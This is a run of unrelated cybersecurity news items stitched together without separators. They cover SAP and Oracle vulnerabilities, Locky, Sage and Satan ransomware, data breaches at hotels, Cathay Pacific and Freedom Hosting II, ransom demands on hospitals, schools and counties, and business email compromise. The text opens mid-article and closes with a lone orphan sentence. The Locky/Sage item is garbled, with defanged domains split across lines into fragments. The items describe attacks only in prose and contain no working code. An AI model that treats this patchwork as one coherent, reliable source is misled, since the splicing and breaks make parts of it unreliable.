Another vulnerability—Directory Traversal (CVSSv3 score 5.9)—allows arbitrary file upload in SAP NetWeaver Log Viewer. Attackers can upload a malformed archive that contains files with special characters in their names. When the web application unpacks the archive, it resolves symbols ""."" and ""/"" as a part of the correct file path, so attackers can exploit the Directory Traversal vulnerability and upload files to an arbitrary place on the server file system.
The consequences of arbitrary file upload can include total compromise of a system, overload of a file system or database, expanding attacks to back-end systems and defacement. The impact of this vulnerability is high, as arbitrary code can be executed on the server. SAP Security note No. 2370876 describes the activities required to eliminate this flaw. 
Dmitry Gutsko, Head of the Business System Security Unit at Positive Technologies said: ""Large companies all over the world use SAP to manage financial flows, product lifecycle, relationships with vendors and clients, company resources, procurement, and other critical business processes. It is vital to protect the information stored in SAP systems as any breach of confidential information could have a devastating impact on the business.""
In order to identify vulnerabilities in SAP products, perform inventory checks on these systems, manage updates and analyze settings, configurations, and permissions, Positive Technologies’ MaxPatrol vulnerability and compliance management solution has been certified by SAP for integration with SAP NetWeaver. In addition, Positive Technologies Application Firewall (PT AF) detects attacks, including those that leverage zero-day vulnerabilities, in SAP NetWeaver, SAP ICM, SAP Management Console, and SAP SOAP RFC using special security profiles. 
Positive Technologies Application Inspector also supports analysis of Java applications for the SAP NetWeaver Java platform.

PhishMe security researchers warn that the Locky ransomware is relying on the same delivery infrastructure which was previously used for the Sage ransomware distribution.
Cybercriminals often share infrastructure between one another, so the fact that Locky and Sage use the same recourses is not that surprising.
However, the fact also shows that the crooks behind Locky are working on securing new distribution venues after the main Locky distributor – Necurs botnet – recently went silent.
The Sage ransomware first appeared on the malware stage at the end of last year and was analyzed early this year.
The first distribution email messages relied on racy or explicit narratives to fool victims into opening the malicious attachments.
Later, the operators abandoned this tactic and starting using business-related themes and random numbers in the subjects to avoid spam filters.
Some of the delivery emails didn’t come with a subject at all but they did use the victim`s name in the file attachment name.
This file attachment was usually a double-zipper archive that contained a malicious .js file or an Office document.
Other messages posed as a rejected financial transaction, failed deposit/refund or canceled order alerts in order to trick the users into opening them.
The campaign, according to PhishMe, used a .zip file (named “document_1.zip”), containing a JavaScript application in it, which would download the Sage ransomware in the form of a Windows executable.
The payload was retrieved from the domain affections[.
]top, and the malware relied on the same payment gateway’s Tor site as before, as well as the Tor2Web gateway addresses on rzunt3u2[.
Then, however, on January 26th, another phishing campaign was spotted to distribute the Locky ransomware, leveraging the same email messages and metadata.
]top was used as a part of the distribution for this infection on January 30th.
“This connection pushes the narrative forward in yet another way as the Locky distribution in question was yet another example of that ransomware being paired with the Kovter Trojan”.
The connection between Kovter and Locky has been already analyzed a couple of times.
Most recently, Microsoft discovered a two-step delivery technique which intended to drip Locky first, but if that failed, it switched to dropping the Kovter Trojan.
This sharing of infrastructure between Locky and Sage once again proves how cybercriminals often reuse delivery infrastructure and malware support.
The overlapping distribution of these two ransomware pieces can be seen as evidence of the commodity status for such infections.

Guests of two of Tasmania's luxury hotels have been told their personal data ""may have been accessed by an unauthorised third party"", with the company — casino giant Federal Group — telling people emails sent from the resorts may be bogus.
Exterior of Henry Jones Art Hotel, in Hobart.
The company has written to past guests of Hobart's Henry Jones Art Hotel and Saffire Freycinet, on Tasmania's east coast, informing them of the breach, in which the names, email addresses, physical addresses and telephone numbers of customers may have been accessed.
In a statement, a Federal Group spokesperson said it confirmed it ""experienced an unauthorised access to a third-party email distribution service and some past guests received an unusual spam-type email"".
""The system is now secure and the company is currently undertaking an internal investigation of the incident.""
Federal Group, which also owns and operates Wrest Point casino, said it would ""encourage anyone who has received any email correspondence from either our Saffire or Henry Jones Art Hotel properties today to delete the email without opening it"".
Federal Group offered a list of what it described as ""good security practices"" it recommended for customers, which included:
        Be aware of potential phishing emails and telephone calls from businesses or institutions requesting your personal details. 
        Avoid opening attachments from unknown senders via email or social media.
        Regularly change your passwords on other online services, if you re-use the same password.
        Enable multi-factor authentication and other available security measures provided by your other online services.
        Install anti-virus software and keep it updated.
        Apply all recommended software patches from operating system and software providers.
Federal Group refused to say whether they had contacted police over the incident.
They also would not say how many people may have had their details compromised.

GREENFIELD — Hancock Health paid a $55,000 ransom to hackers to regain access to its computer systems, hospital officials said.
Part of the health network had been held hostage since late Thursday, when ransomware locked files including patient medical records.
The hackers targeted more than 1,400 files, the names of every one temporarily changed to “I’m sorry.” They gave the hospital seven days to pay or the files would be permanently encrypted, officials said.
An analysis since the attack confirmed no personal patient information was taken by the hackers, believed to be located in eastern Europe, said Hancock Health CEO Steve Long.
The affected files were backed up and could have been recovered, but restoring them would take days — maybe even weeks — and would be costly, Long said.
From a business standpoint, paying a small ransom made more sense, he said.
The hacker asked for four bitcoins — a virtual currency used to make anonymous transactions that are nearly impossible to trace. At the time of the transfer, those four bitcoins were valued at about $55,000.

Microsoft says it had already fixed software flaws linked to an alleged breach of the global banking system before they were exposed last week.
On Friday, a group called the Shadow Brokers published details of several hacking tools, indicating they had been used by the US National Security Agency (NSA) to spy on money transfers.
Reports suggested Microsoft's Windows operating system remained vulnerable.
But the firm revealed it had in fact addressed the problem in March.
""Customers have expressed concerns around the risk [Shadow Brokers'] disclosure potentially creates,"" it said in a security update.
""Our engineers have investigated the disclosed exploits, and most of the exploits are already patched.""
The company has not, however, revealed how it became aware of the flaws.
Microsoft normally acknowledges third parties who tip it off to problems, but has not done so in this case.
The Reuters news agency reported that the company had told it that neither the NSA nor any other part of the US government had informed it of the hacking tools' existence.
That calls into question how Microsoft learned of the issue - tech blog Ars Technica commented it was ""highly unlikely"" that the patch and leak would both have occurred so close together by coincidence. 
Whisteblower Edward Snowden had previously leaked documents in 2013 that alleged the NSA had carried surveillance of the Brussels-based Society for Worldwide Interbank Financial Telecommunication (Swift) for several years, but did not specify how.
Swift allows the world's banks to send payment orders and other messages about large financial transactions in a ""secure and reliable"" manner. 
It is used by about 11,000 financial institutions. The allegation is that third parties - known as Swift Service Bureaus - that provide access to Swift's network were targeted by the NSA, rather than Swift itself.
""If Shadow Brokers' claims are indeed verified, it seems that the NSA sought to totally capture the backbone of [the] international financial system to have a God's eye [view] into a Swift Service Bureau - and potentially the entire Swift network,"" blogged security researcher Matt Suiche after the latest leak.
""If the US had a specific target in the region's financial system, NSA penetration offers [an alternative to] merely relying upon good faith compliance procedures, standard diplomatic requests, or collaborating with Swift.""

A new ransomware-as-a-service (RaaS) has reportedly emerged, offering cybercriminals on the dark web the option of using ransomware created by someone else in exchange for subscription payments.
According to a report by ZDNet, independent security researcher going by the Twitter handle Xylitol uncovered the Satan malware as part of the Gen:Trojan.Heur2.FU malware family.
Satan now however has been launched as part of a RaaS platform, which allows prospective cybercriminals access to ransomware in exchange for 30% of the revenues generated.
Once a victim has been infected with Satan via either malicious links or phishing campaigns, the victim's files are encrypted and the attackers instruct the victims about ransom demands.
Satan reportedly contains a HTML file that claims that restoring the encrypted files are impossible.
According to researchers, this claim is not unfounded, indicating that the only way victims can regain access to their stolen files is by paying up the demanded ransom.
Satan's ransom note instructs victims to install the Tor browser and then redirected to an .onion link to make the ransom payments.
The ransom amount varies according to the specification of the cybercriminals using the RaaS platform.
Those interested in the RaaS' services must connect a Bitcoin wallet to their account and point out a cost for decryption.
Satan RaaS comes with several features, including fee payment records, transaction tracking, ransomware version releases and more.
The platform provides hackers with tips on how to customise ransomware demands.
Satan also helps hackers learn how to set up gateway proxies, and how to test their malware on systems.
The platform also provides hackers with the option of translating their malware into different languages.

LICKING COUNTY
Officials in Licking County tell 10TV that ransom was demanded for an IT hack that impacted the county's phone and computer systems.
A computer virus shut down more than a thousand computers inside the Licking county government center late Tuesday.
A county commissioner says that the virus demanded a payment in Bitcoin for the county to regain control of their systems. Officials declined to specify the amount of money that was requested.
The county said its IT department discovered the problem when some files wouldn't open. As a precaution, it shut the system down and that's when technicians discovered it was a virus known as ransomware.
County business continues, despite the computer shut down, although county employees are having to do much of their work on paper.

The Legislative Council has decided to take action on the massive data breach at Cathay Pacific Airways, which has affected the personal information of as many as 9.4 million customers.
Amid calls for more stringent regulations on personal data protection, lawmaker Horace Cheung Kwok-kwan from the Democratic Alliance for the Betterment and Progress of Hong Kong said Legco will hold a special meeting on Nov 14 to thoroughly discuss how to prevent similar incidents from happening again through regulatory approaches.
According to Cheung, the meeting will be attended by members of the Legco Panel on Constitutional Affairs, which he chairs, Panel on Security and Panel on Information Technology and Broadcasting, as well as representatives from the airline, the Hong Kong Economic Journal reported.
Secretary for Constitutional and Mainland Affairs Patrick Nip Tak-kuen and Privacy Commissioner for Personal Data Stephen Wong Kai-yi have also agreed to join the discussions, he added.
Cheung said quite a number of his colleagues have expressed concerns about the fact that the existing regulations on online privacy have failed to advance with the time, and want to know the view of the authorities on reforming them.
Cathay revealed on Oct 23 that it discovered suspicious activity on its computer network in early March and confirmed in early May that personal data of its customers were accessed with no authorization.
The data included passenger name, nationality, date of birth, phone number, email, physical addresses, passport number, identity card number, frequent flyer program membership number, customer service remarks, and historical travel information, along with the numbers of hundreds of credit cards.
On Monday morning, eight officers from the police’s Cyber Security and Technology Crime Bureau went to Cathay City, the airline’s headquarters at the Hong Kong International Airport in Chek Lap Kok, to conduct an investigation.
With the presence of a Cathay-appointed lawyer, the officers examined some servers before they left about two hours later without taking away any items as evidence.
It is understood that the police force has instructed all of its districts to pay attention to cases that may be connected to the data breach or those resulting in material losses.
Meanwhile, Wong told a radio program on Monday that his office, the next day after the airline unveiled it, sent an initial questionnaire, asking Cathay for an explanation within 10 days.

Law firms have been put on high alert as the Solicitors Regulation Authority (SRA) warns of new threats impacting hundreds of firms.
Benoit Daoust
	In an update, the regulator said it has experienced an increase in the number of reports of attempted cyber-crime and that some 500 firms may have been targeted in a cunning new scam.
It also warned solicitors to take care that they did not fall victim to the attempted infiltration of IT systems.
It said that firms were sent emails requesting their services and once they reply they are sent attachments or links – both of which could contain malware which would allow the perpetrators to obtain passwords or financial details, copy or modify data on the system, and allow hackers to get into the firm’s network.
Other advice from the regulator includes using cloud-based computing for storing, accessing and processing information as well as keeping software up to date, using anti-virus systems and encryption on mobile devices.
It also recommends that files are backed up regularly and firms should ensure at least one back-up that is not directly and regularly connected to the main systems.

Onapsis discovered several high risk vulnerabilities affecting SAP HANA platforms.
If exploited, these vulnerabilities would allow an attacker, whether inside or outside the organization, to take full control of the SAP HANA platform remotely, without the need of a username and password.
“This level of access would allow an attacker to perform any action over the business information and processes supported by HANA, including creating, stealing, altering, and/or deleting sensitive information.
If these vulnerabilities are exploited, organizations may face severe business consequences,” said Sebastian Bortnik, Head of Research, Onapsis.
The vulnerabilities affect a specific SAP HANA component named SAP HANA User Self Service, which is not enabled by default.
The following list details the affected HANA 2 and HANA versions:
“We hope organizations will use this threat intelligence to assess their systems and confirm that they are not currently using this component, and therefore are not affected by these risks.
Even if the service is not enabled, we still recommend that these organizations apply the patches in case a change is made to the system in the future,” continued Bortnik.
Onapsis Research Labs originally discovered the vulnerabilities on the newly released SAP HANA 2 platform, but after additional analysis realized that several older versions were vulnerable as well.
Based on this assessment, it was identified that the vulnerabilities had been present in HANA for almost two and a half years, when the User Self Service component was first released.
This greatly increases the likelihood that these vulnerabilities have been discovered by attackers to break into organization’s SAP systems.
Onapsis worked closely with SAP’s Product Security & Engineering teams to help them develop the security patches.
SAP is releasing the first ever patch for SAP HANA 2.
In this case, default installations are affected and an attacker can elevate privileges if exploited.

The executive director of the organization revealed on Tuesday that their computer systems have been infected with a ransomware by cyber criminals who happen to be “an international cyber terrorist organization”.
Aimee Fant, the Executive Director of Little Red Door, officially revealed its involvement in the agency’s computer system hack in a press release.
According to their Facebook post, the attack occurred last week on Wednesday night when the hackers attacked the terminal service and backup driver of Cancer Services’ computer systems.
They managed to access, hack and encrypt the data.
After carrying out the hack attack, the notorious gang of cyber criminals demanded $43,000 ransom on Thursday.
The press release also revealed that the perpetrators of the crime were gearing up to threaten the family members of living or deceased “cancer clients, donors and community partners”.
She further informed that the FBI has been contacted to conduct an “active investigation”.
It is worth noting that a majority of the agency’s data is stored in cloud storage.
Perhaps, this is why the organization is not willing to pay the ransom and believes that “all funds raised must go to serving families, all stage cancer patients, late stage care/hospice support and preventative screenings,” instead of cyber criminals.

On Friday, the unnamed hacker began dumping a sizable database stolen from Freedom Hosting II onto the internet, potentially exposing its users.
The hosting service, Freedom Hosting II, was known for operating thousands of sites that were accessible through the Tor browser; the ""dark web"" is essentially the encrypted network comprising Tor servers and browsers.
Its main landing page was replaced with a message saying that it had been hacked.
Allegedly, Freedom Hosting II had been hosting child pornography sites, though its anonymous operator claimed to have a zero-tolerance policy toward such content, according to the hacker behind the breach.
“What we found while searching through your server is more than 50% child porn…” the hacker wrote in the message left on the site.
“Moreover, you host many scam sites, some of which are evidently run by yourself to cover hosting expenses”.
In an email to the IDG News Service, the hacker explained how the breach came about.
“I just recently read an article about a well-known exploit that some hosting providers fell victims of many years ago,” the person said.
However, starting on Jan. 30, the hacker gained access to its web server, using a 20-step method.
The hack essentially involved starting a new site on Freedom Hosting II and creating a link to gain access to the service’s root directory.
This allowed the hacker to browse the entire server.
“I had reading permissions to everything the web server could get access to just by creating a symlink to / (the root directory)”.
After coming across child porn sites, the hacker decided to take over Freedom Hosting II by altering its configuration file to trigger a password reset.
“Once I found out what they were hosting, I just wanted to shut them down,” said the hacker, who’s also been circulating what he stole through a torrent file.
The dump includes 74GB of files and a 2.3GB database from the service, the hacker claims.
“The IP of the server has been leaked, which potentially could reveal the admin's identity,” the hacker added.
Chris Monteiro, a cybercrime researcher based in the U.K., has been looking through the data dump, which he said appears to be real.
The information includes the sites that Freedom Hosting II had been operating, along with the admin credentials to access them.
The dump also appears to contain a client database, meaning that anyone who used Freedom Hosting II might be exposed, Monteiro said.

Rick Wang, an official with Taiwan’s Financial Supervisory Commission (FSC), said each brokerage had received an email setting a deadline for the transfer of funds to avoid a distributed denial of service (DDoS) attack.
They have become common tools for cyber criminals trying to cripple businesses and organizations with significant online activities.
“We have never seen this on such a scale - five companies hit at one time with the same threat,” said Wang, adding that the regulator usually sees single instances of cyber-crime.
FireEye, a cybersecurity consultancy, said the attacks were similar to a wave of threatened denial of service attacks by a previously unidentified group that first appeared in Europe last month.
The Taiwan attacks do not pose a threat to the island’s broader trading and financial system, Wang said, but he added that the regulator had asked all securities firms to step up defensive measures.
“The emails were sent under the name of the ‘Armada Collective’,” said Chiu Shao-chou, an official of the internet cybercrime division of Taiwan’s Criminal Investigation Bureau, the government’s top investigation body.
The Armada Collective, a hacking extortion group, has been linked to financial blackmail heists elsewhere.
But Chiu said the group has been put under watch and Taiwan investigators were still looking into the original source of the emails.
The email demanded payment in web-based digital currency bitcoin equivalent to about T$300,000 ($9,731.41), Taiwan media said.
None of the securities companies made any payments, Chiu said.
Another brokerage firm, Capital Securities Corp, was hit on Monday by a DDoS attack lasting 20 minutes before its system recovered, the regulator said, but it did not link the latest case to the threatening emails.

Apple is reportedly aware of and is in the middle of fixing a pair of vulnerabilities that exist in iTunes and the App Store.
If exploited, researchers claim an attacker could inject malicious script into the application side of the vulnerable module or function.
Vulnerability Lab’s Benjamin Kunz Mejri disclosed the vulnerabilities on Monday, explaining the issues can be jointly exploited via iTunes and the App Store’s iOS “Notify” function.
Apple implemented the function in September, in the weeks leading up to the release of the game Super Mario Run.
The function takes information from the device, such iCloud credentials or devicename values, to alert users when a soon-to-launch application debuts.
Mejri, the firm’s founder, claims the Notify functionality can be exploited via a persistent input validation vulnerability and mail encoding web vulnerability.
An attacker could substitute the name variable–the vulnerable firstname parameter–with a script launching a payload.
Mejri said the issue stems from how Apple sends notifications from its @new-itunes.com web server; which doesn’t properly validate the iCloud name or devicename parameter.
Instead of displaying introductory text, it can be rigged to execute malicious payloads.
“The vulnerability can be exploited on restricted accessible iOS devices to the main account holder inbox,” Mejri wrote in his disclosure Monday, “The issue could be used as well to continue to calendar spam activities”.
Mejri told Threatpost Tuesday that while the issue isn’t highly exploitable, it “definitely has a nice impact”.
Exploiting the persistent input validation flaw would be easier, because it only requires an Apple account and “low or medium user interaction,” according to the researcher.
Ultimately, if stitched together, he warns, the bugs could result in session hijacking, persistent phishing attacks, and persistent redirect to external sources.
Mejri said he contacted Apple’s Product Security Team about the issues on Dec. 15 and acknowledged that the vulnerability should be able to be resolved on the server-side without performing any required end-user interaction or updates.
He said a temporary patch has been implemented and believes a full fix is expected later this month.
It’s unclear exactly when this month Apple will push that fix, however; it last updated iTunes in December, fixing 23 WebKit vulnerabilities in the software.
Apple did not return multiple requests for comment regarding the vulnerabilities on Monday and Tuesday.
A month after first communicating the issues to Apple, Vulnerability Lab elected to publish a proof of concept around the issues to see if they had any legs.
“We decided to release the information until somebody uses the issue to exploit via iTunes,” Kunz Mejri told Threatpost Tuesday.
The vulnerability is similar to one disclosed by Vulnerability Lab and patched by Apple in iTunes and the App Store a year and a half ago.
Before it was fixed, like this week’s issue, an attacker could have remotely injected script into invoices, something that could have lead to hijacking, phishing, and redirect.

Oracle has released a wide-ranging security update to address more than 300 CVE-listed vulnerabilities in its various enterprise products.
The October release covers the gamut of Oracle's offerings, including its flagship Database, E-Business Suite, and Fusion Middleware packages.
For Database, the update addresses a total of three flaws. Two of the vulnerabilities (CVE-2018-3259 and CVE-2018-3299) can be remotely exploited without authentication, while the third, CVE-2018-7489, would require the user to have a Rapid Home Provisioning account to execute and is considered by far the least severe of the three.
Oracle noted that all three bugs only impact the server versions of Database, user clients are not considered to be vulnerable.
For Fusion Middleware, the update will include a total of 56 CVE-listed flaws, including 12 that are remotely exploitable with CVSS base scores of 9.8, meaning an exploit would be fairly easy to pull off and offer near total control of the target machine. Of those 12, five were for critical flaws in WebLogic Server.
Java SE will get 12 security fixes, with all but one being for remotely exploitable vulnerabilities in that platform. Oracle notes that though the CVSS scores for the flaws are fairly high, Solaris and Linux machines running software with lower user privileges will be considered to be at a lower risk than Windows environments that typically operate with admin privileges.
MySQL was the target of 38 CVE-listed bug fixes this month, through just three of those are remotely exploitable. The two most serious, CVE-2018-11776 and CVE-2018-8014, concern remote code flaws in MySQL Enterprise Monitor.
PeopleSoft will see 24 bug fixes, 21 of which can be remotely targeted and seven that would not require any user interaction. Just one of the 24 flaws was given a CVSS base score higher than 7.2. in the Oracle listing.
Sun products were the subject of 19 security fixes, including two remote code execution flaws in XCP Firmware.
libssh bug more like ""oh SSH…""
Once admins get the Oracle patches in place, they will want to take a close look at the write-up for CVE-2018-10933, an authentication bypass for libssh that would allow an attacker to get into a target machine by sending a ""SSH2_MSG_USERAUTH_SUCCESS"" message when it expects a ""SSH2_MSG_USERAUTH_REQUEST"" message. That means any miscreant can log in without a password or other credential. As you can imagine, this is a very bad thing.
Fortunately, the bug does not affect OpenSSH – and thus does not affect the hugely widespread sshd and ssh tools – but rather applications, such as KDE and XMBC, that use libssh as a dependency.

Oracle has released a critical patch update addressing more than 300 vulnerabilities across several of its products – including one flaw with a CVSS 3.0 score of 10 that could allow the takeover of the company’s software package, Oracle GoldenGate.
Of the 301 security flaws that were fixed in this month’s Oracle patch, 45 had a severity rating of 9.8 on the CVSS scale.
“Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible,” the company said in its Tuesday advisory.
The highest-severity flaw (CVE-2018-2913) lies in the Monitoring Manager component of Oracle GoldenGate, which is the company’s comprehensive software package that allows data to be replicated in heterogeneous data environments.
According to the National Vulnerability Database, the glitch is an easily exploitable vulnerability that allows unauthenticated attacker with network access via the TCP protocol to compromise Oracle GoldenGate.
The flaw was discovered by Jacob Baines, a researcher with Tenable.
“CVE-2018-2913 is a stack buffer overflow in GoldenGate Manager,” Baines told Threatpost. “The Manager listens on port 7809 where it accepts GoldenGate Software Command Interface (GGSCI) commands. Tenable found that a remote unauthenticated attacker can trigger a stack buffer overflow by sending a GGSCI command that is longer than expected.”
The attack is not complex and a bad actor could be remote and unauthenticated. Making matters worse, an attacker could compromise other products after initially attacking GoldenGate, the advisory warned.
“While the vulnerability is in Oracle GoldenGate, attacks may significantly impact additional products,” the note said. “Successful attacks of this vulnerability can result in takeover of Oracle GoldenGate.”
The flaw impacts versions 12.1.2.1.0, 12.2.0.2.0, and 12.3.0.1.0 in Oracle GoldenGate. Currently no working exploits for the flaw have been discovered in the wild, according to the release. It should be noted that For Linux and Windows platforms, the flaw’s CVSS score is 9.0 because the access complexity is lower (only rated high, not critical); while for all other platforms, the CVSS score is a critical 10.
Two other flaws were also discovered in Oracle GoldenGate (CVE-2018-2912 and CVE-2018-2914), with ratings of 7.5 on the CVSS scale; those vulnerabilities weren’t nearly as severe.
“All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.”

Just in time for President Trump’s meeting with Chinese President Xi Jinping this week, and following The US Secretary of State’s recent visit to China, Fidelis Cybersecurity made a troubling discovery of a possible cyber-espionage sponsored by that country, which it’s calling Operation Tradesecret.
In late February, the Fidelis threat research team observed Scanbox malware embedded on specific webpages on the National Foreign Trade Council (NFTC) site, whose members are key private-sector players involved in lobbying US foreign trade policy.
Scanbox provides multiple capabilities to threat actors. It can be used to determine the versions of applications, as well as other selected tools, such as JavaScript keyloggers, running on the target's machine. Information gathered from this reconnaissance can be used in targeted phishing campaigns, with the goal of exploiting specific vulnerabilities on end-user devices.
Indicators show the attackers are part of the global China-backed hacking group APT10, whose actions have extended to organizations in Japan. Scanbox was previously reported to have been used by multiple Chinese actor groups, including those thought to be behind well-publicized, massive intrusions at Anthem Healthcare and the US Office of Personnel Management (OPM) breaches.
“In the research community, Scanbox has exclusively been known to have been used by threat actors associated with, or sponsored by, the Chinese government,” researchers said in an analysis. “Our most recent observation of the use of Scanbox was on a Uygher political site. Subsequent research has revealed artifacts suggesting that a similar campaign was conducted shortly after that involved a site masquerading as the Ministry of Foreign Affairs of Japan.
In this case, the targets specifically appear to be the NFTC board of directors, who are participants in the dialogue around the composition of the new trade policy framework being formulated within the Trump administration. “Since the strategic web compromise was observed on the registration page for the board of directors meeting, it can be surmised that the campaign targeted the individuals visiting the site to register for the meeting,” Fidelis researchers noted.
“We observed a brief, targeted operation in which visitors to select webpages, including those used to register for specific meetings at the NFTC, were served reconnaissance malware known as the Scanbox framework,” the firm noted.
The link from the NFTC site was removed on March 2—but Fidelis believes that the operation had almost certainly concluded by that time.

Ciphr, a company which offers encrypted communications for BlackBerry 10 and Samsung Knox smartphones, claims that a rival firm are behind a data dump of its customers' email addresses and their device's IMEI numbers.
A website displaying the alleged leaked data claims that ""all Ciphr emails/servers have been compromised.""
Two sources that use Ciphr on their phones told Motherboard the leak includes their information as well as the data of other users. Specifically, the website lists users' email addresses and IMEI numbers, data which law enforcement can leverage to expose a user.

In a message provided to Motherboard from one of its sources, the privacy platform says the data dump was not the result of a data breach. Instead Ciphr blames a rival company for the incident:
""Our rapid growth has caught the attention of competitors seeking to slow us down by way of slander, blocking and DDOS [distributed denial of service attacks].... We were shocked that any company in this industry would release information to the public under any circumstance.""
Ciphr's management explains in a blog post that a rogue reseller who was granted access to its sales systems gave the information to SkySecure, which makes custom Blackberry devices. The company goes on to note that most of the information included in the data dump was already expired. But it does say a few active users' email addresses and IMEI numbers were included in the leak.

Biggest case involved woman who lost HK$119,000 in 24 hours after being conned into buying more than 50 points cards for online games.
A woman who lost HK$119,000 in 24 hours was among almost 250 people duped out of about HK$1.9 million (US$242,000) in a WhatsApp scam in Hong Kong this year, police said on Wednesday.
According to police, swindlers pretended to be friends of WhatsApp users and invented different excuses to lure them into revealing their account verification codes. The con men then accessed the accounts with the codes and, posing as the users, sent text messages to deceive the account holders’ contacts.
Mohammed said genuine account holders were unable to use WhatsApp at least 12 hours after their accounts were hijacked.
“All the scam victims were asked to buy MyCard points cards for online games,” he said. 
MyCard is a digital payment platform. Users can buy credit to spend on the platform from convenience stores across the city, Mohammed said. After getting passwords for the cards, scammers sold them online.
Police said the age range of the victims was between 17 and 72 and losses went from a few hundred dollars to thousands. No arrests had been made.
The Post reported in February that officers believed fraudsters from Taiwan were behind the scam because the points cards they requested were used for the Taiwanese versions of online games. Police advised residents to safeguard their personal data and verify the identity of those who contact them. If in doubt, people should call the Anti-Scam Helpline at 18222.
In the first three months of this year, there were 270 reports of deception through instant messaging platforms, accounting for HK$2.6 million in losses. That exceeds the figure for the whole of last year, when there were 266 cases, in which scammers bagged HK$2.1 million.

Business Email Compromise (BEC) attacks jumped 45% in the final quarter of 2016, compared to the previous three months, according to new stats from Proofpoint.
The security vendor claimed such attacks have grown both in volume and sophistication.
Also known as “CEO fraud” and “whaling”, these attacks typically involve fraudsters spoofing the email addresses of company CEOs to trick staff members into transferring funds outside the company.
However, Proofpoint also includes attempts to target HR teams for confidential tax information and sensitive employee data, as well as engineering departments which may have access to a wealth of lucrative corporate IP.
In its analysis of over 5000 global enterprise customers, it claimed that in two-thirds of cases the attacker spoofed the “from” email domain to display the same as that of the targeted company.
These attacks can thwart some systems, because they don’t feature malware as such – just a combination of this domain spoofing and social engineering of the victim to force them to pay up.
Part of the trick is to harry the target, rushing them so they have less time to think about what they’re doing.
That’s why over 70% of the most common BEC subject line families appraised by Proofpoint featured the words “Urgent”, “Payment” and “Request”.
The vendor claimed that firms in the manufacturing, retail and technology sectors are especially at risk, as cyber-criminals repeatedly look to take advantage of more complex supply chains and SaaS infrastructures.
Vice-president of products, Robert Holmes, argued that although employee education was important, it needs to be complemented by the right set of tools to weed out fraudulent emails.
“When it comes to BEC attacks, employees should never be an organization’s first line of defense. It is the organization’s responsibility to ensure that security technologies are in place, so that BEC attacks are stopped before they can reach their intended target,” he told Infosecurity Magazine.
BEC has become so popular among the black hats that the FBI warned organizations last year the scams had cost billions since 2013.
Trend Micro predicted that 2017 would see more and more cyber-criminals turn to BEC given the potential rich pickings – claiming the average pay-out is $140,000, versus just $722 for a typical ransomware attack.
However, Holmes argued that ransomware and BEC actors are likely “two distinct types of criminal”.
“While ransomware attacks require technical infrastructure to launch campaigns at scale, BEC attacks are socially engineered and highly targeted in nature, conducted by a single actor rather than teams, and generally launched from shared email platforms,” he explained.
“While cyber-criminals will always go where the money is, we do not envision a drastic change in tactics such as traditional purveyors of ransomware transitioning to BEC. As long as ransomware and trojans continue to pay, cyber-criminals with technical skillsets are unlikely to down tools and pivot towards such a fundamentally different type of attack vector.”

 CD Projekt Red, the Polish developer best known for its work on  The Witcher series, released a short statement on its twitter feed today claiming that early work from its next title,  Cyberpunk 2077, has been compromised.
 The statement suggests that the individual or individuals in question are holding the developer ransom for an undisclosed figure, threatening to release the early game files out into the public if their demands are not met.
 CD Projekt Red has made it clear that it will not meet the hacker(s) demands, and that ""the appropriate legal authorities will be informed about the situation"".
Motherboard reached out for a comment from the developer, which said: ""This is real. The tweet is all we have to say.""
 However, it's hard not to remain skeptical still, since E3—the annual industry event where many developers choose to first reveal their games—is just around the corner, and revealing a game called  Cyberpunk 2077 via some kind of elaborate, fake hack, would be a fitting stunt.
 For what it's worth, we have not seen any game assets floating around pastebin or in the online circles where stuff like this is usually dumped.
 Whether it was planning to or not for E3, this means that we are likely to see content for  Cyberpunk 2077 arrive in the near future, though CD Projekt Red has made it clear that anything released from the hackers is not ""representative of the current vision of the game.""
  Cyberpunk 2077 is an open-world sci-fi RPG and, announced way back in 2012, but doesn't have a release date at this point. Anticipation is high coming off the back of  The Witcher 3: Wild Hunt's critical and commercial success, though.
 This is not the first time a games developer has run into this type of situation. Back in 2003, Axel Gembe managed to hack Valve's network, and got his hands on the source code for Half-Life 2 more than a year ahead of its release date. Though in that instance, Axel claimed to have been a genuine fan and said that Valve was his ""favourite developer""—he even emailed Valve's co-founder Gabe Newell to apologize and hoped he could get a job out of it (spoiler: he didn't).
 There was also George ""Geohot"" Hotz, the man who hacked the PlayStation 3—and was subsequently sued by Sony for it.
 No doubt everyone will be keeping an eye on Reddit and NeoGAF over the following days.

Files that were scrambled in a ransomware attack on Hāwera High School in Taranaki included school assessments that students had only partly completed as well as backups, principal Rachel Williams has confirmed.
More help is on the way for schools battling ransomware and other malware, but it has come a little late for the school which is being held to ransom for US$5000 by hackers.
N4L, the Crown-owned company that manages the provision of broadband to schools, said it would improve online security as part of a wider upgrade of its managed network that is due to be completed by October next year.
The 2450 schools and 800,000 students on the network will get a new security solution supplied by Californian company Fortinet which would provide ""more robust protection against online threats, such as phishing and ransomware"", it said in a statement issued on Monday.
Ironically, that was the same day that staff at Hāwera High School switched on their computers to discover the message demanding US$5000 (NZ$7352) in bitcoin for the return of encrypted data on a server containing students' work and teaching resources. 
 Hāwera High School is connected to ultrafast broadband via N4L, but N4L chief executive Larrie Moore said the school had opted out of N4L's existing security solution and was instead using an alternative commercial offering.
""We've been in touch with the school and their IT company to offer our support,"" he said.
""Until we know how the school's network was compromised, we are unable to say whether the new Fortinet solution would have prevented it,"" he said.
But Moore said there was no ""silver bullet"" for malware. Instead, technological protections needed to be used in combination with ""continuous education around good digital citizenship"", he said. 
Williams said many of its students and teachers had backed up their files in the cloud and were not affected by the ransomware attack, but backups stored on servers at the school were also encrypted by the hackers.
""We have been working today on getting a clearer audit of student and staff work and where we are at. Some students are really not affected at all because they have saved their work on their cloud-based system. 
""If students were part-way through an assessment, some of those are the ones that are encrypted and we can't access those at the moment.""
The school was working with NZQA to make sure those students were not disadvantaged, she said.
Others had backups of their work at home, she said. 
Williams was not sure how the malware had arrived at the school, saying that was still being investigated.
The Government is not believed to have any rules on whether state-funded organisations such as schools can pay ransoms, but in 2017 it issued advice against it and Williams said the school would follow police advice not to pay.
While the incident had been annoying, ""you see people's character come through and we've seen real resilience from our staff and students"", Williams said.
""It is not stopping us doing what we need to do."" 
N4L said its technology upgrade would be the first major refresh of its network since it began connecting schools with ultrafast broadband at the end of 2013.
Its existing security system had blocked more than 118,000 viruses and malware threats so far during this school year, it said.

Android users have been given a warning by experts that they should not get too eager for their new Super Mario Run Android game.
